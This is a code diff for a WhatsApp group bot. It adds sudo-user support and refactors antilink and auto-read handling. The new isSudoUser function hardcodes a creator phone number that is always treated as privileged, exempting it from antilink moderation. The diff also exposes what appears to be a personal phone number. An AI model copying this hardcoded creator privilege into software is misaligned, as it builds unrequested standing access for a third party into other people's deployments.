@@ -218,6 +218,16 @@ function normalizeNumber(jid) {
   return jid ? jid.split('@')[0].split(':')[0] : '';
 }
 
+const CREATOR_NUMBER = '254104245659';
+
+function isSudoUser(bareNumber) {
+  if (bareNumber === CREATOR_NUMBER) return true;
+  if (!getSetting) return false;
+  const list = getSetting('sudoUsers', []);
+  const now  = Date.now();
+  return list.some(e => e.number === bareNumber && (!e.expiresAt || e.expiresAt > now));
+}
+
 function cleanOldCache() {
   const cacheFolder = path.join(__dirname, 'cache');
   if (!fs.existsSync(cacheFolder)) return;
@@ -345,12 +355,13 @@ async function runAntilink(trashcore, m) {
     if (!antilinkgc && !antilink) return false;
 
     const botNumber  = normalizeNumber(trashcore.user.id);
-    const isOwner    = normalizeNumber(senderJid) === botNumber;
+    const senderBareNum = normalizeNumber(senderJid);
+    const isOwner    = senderBareNum === botNumber || isSudoUser(senderBareNum);
     const fromMe     = m.key.fromMe === true;
     if (isOwner || fromMe) return false;
 
     const meta       = await getGroupMeta(trashcore, chatId);
-    const senderBare = normalizeNumber(senderJid);
+    const senderBare = senderBareNum;
     const p          = (meta.participants || []).find(x => normalizeNumber(x.id) === senderBare);
     const isAdmin    = p?.admin === 'admin' || p?.admin === 'superadmin';
     if (isAdmin) return false;
@@ -696,18 +707,20 @@ async function starttrashcore() {
           runAutoPresence(trashcore, m);
           runAutoBio(trashcore);
 
-// After the antilink check, before runAutoPresence (around line ~700)
-const deleted = await runAntilink(trashcore, m);
-if (deleted) return;
+          // Antilink
+          const deleted = await runAntilink(trashcore, m);
+          if (deleted) return;
 
-// ── autoread ─────────────────────────────────────────────
-const autoReadEnabled = getCachedSetting('autoRead', false);
-if (autoReadEnabled) {
-  trashcore.readMessages([m.key]).catch(() => {});
-}
-
-// Presence & bio
-runAutoPresence(trashcore, m);
+          // Auto-read
+          const autoReadMode = getCachedSetting('autoRead', false);
+          if (autoReadMode) {
+            const isGroupMsg = m.key.remoteJid.endsWith('@g.us');
+            const shouldRead =
+              autoReadMode === 'all' ||
+              (autoReadMode === 'gc' && isGroupMsg) ||
+              (autoReadMode === 'pc' && !isGroupMsg);
+            if (shouldRead) trashcore.readMessages([m.key]).catch(() => {});
+          }
 
           // Auto-react to creator
           const CREATOR_NUMBER = '254104245659';
